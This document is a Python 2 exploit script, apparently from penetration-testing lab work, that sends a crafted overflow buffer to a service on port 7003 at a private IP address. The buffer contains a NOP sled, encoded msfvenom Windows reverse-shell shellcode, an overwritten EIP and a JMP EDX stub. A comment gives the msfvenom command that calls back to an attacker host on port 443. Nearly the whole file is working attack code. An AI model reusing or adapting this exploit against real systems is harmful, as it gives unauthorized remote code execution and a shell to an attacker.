#!/usr/bin/python
import socket

# msfvenom -p windows/shell_reverse_tcp lhost=192.168.119.214 lport=443 -f c -e x86/shikata_ga_nai -b "\x00\xc5"
shellcode = ("\xba\x50\x3e\xd8\x88\xdb\xd8\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x83\xc3\x04\x31\x53\x0e\x03\x03\x30\x3a\x7d\x5f\xa4\x38"
"\x7e\x9f\x35\x5d\xf6\x7a\x04\x5d\x6c\x0f\x37\x6d\xe6\x5d\xb4"
"\x06\xaa\x75\x4f\x6a\x63\x7a\xf8\xc1\x55\xb5\xf9\x7a\xa5\xd4"
"\x79\x81\xfa\x36\x43\x4a\x0f\x37\x84\xb7\xe2\x65\x5d\xb3\x51"
"\x99\xea\x89\x69\x12\xa0\x1c\xea\xc7\x71\x1e\xdb\x56\x09\x79"
"\xfb\x59\xde\xf1\xb2\x41\x03\x3f\x0c\xfa\xf7\xcb\x8f\x2a\xc6"
"\x34\x23\x13\xe6\xc6\x3d\x54\xc1\x38\x48\xac\x31\xc4\x4b\x6b"
"\x4b\x12\xd9\x6f\xeb\xd1\x79\x4b\x0d\x35\x1f\x18\x01\xf2\x6b"
"\x46\x06\x05\xbf\xfd\x32\x8e\x3e\xd1\xb2\xd4\x64\xf5\x9f\x8f"
"\x05\xac\x45\x61\x39\xae\x25\xde\x9f\xa5\xc8\x0b\x92\xe4\x84"
"\xf8\x9f\x16\x55\x97\xa8\x65\x67\x38\x03\xe1\xcb\xb1\x8d\xf6"
"\x2c\xe8\x6a\x68\xd3\x13\x8b\xa1\x10\x47\xdb\xd9\xb1\xe8\xb0"
"\x19\x3d\x3d\x16\x49\x91\xee\xd7\x39\x51\x5f\xb0\x53\x5e\x80"
"\xa0\x5c\xb4\xa9\x4b\xa7\x5f\x16\x23\xd0\x49\xfe\x36\x1e\x77"
"\x44\xbf\xf8\x1d\xaa\x96\x53\x8a\x53\xb3\x2f\x2b\x9b\x69\x4a"
"\x6b\x17\x9e\xab\x22\xd0\xeb\xbf\xd3\x10\xa6\x9d\x72\x2e\x1c"
"\x89\x19\xbd\xfb\x49\x57\xde\x53\x1e\x30\x10\xaa\xca\xac\x0b"
"\x04\xe8\x2c\xcd\x6f\xa8\xea\x2e\x71\x31\x7e\x0a\x55\x21\x46"
"\x93\xd1\x15\x16\xc2\x8f\xc3\xd0\xbc\x61\xbd\x8a\x13\x28\x29"
"\x4a\x58\xeb\x2f\x53\xb5\x9d\xcf\xe2\x60\xd8\xf0\xcb\xe4\xec"
"\x89\x31\x95\x13\x40\xf2\xa5\x59\xc8\x53\x2e\x04\x99\xe1\x33"
"\xb7\x74\x25\x4a\x34\x7c\xd6\xa9\x24\xf5\xd3\xf6\xe2\xe6\xa9"
"\x67\x87\x08\x1d\x87\x82")

try:
  print "\nSending evil buffer..."
  nop_sled = "\x90" * 16
  filler = "B" * (2080 - len(nop_sled) - len(shellcode))
  eip = "\x1e\x11\x80\x14" # 0x1480111e
  first_stage = "\xff\xe2"  # JMP EDX -> ffe2
  nop_pad  = "\x90" * (2100 - len(nop_sled) - len(shellcode) - len(filler) - len(eip) - len(first_stage))
  inputBuffer = nop_sled + shellcode + filler + eip + first_stage + nop_pad

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7003))
  s.send(inputBuffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
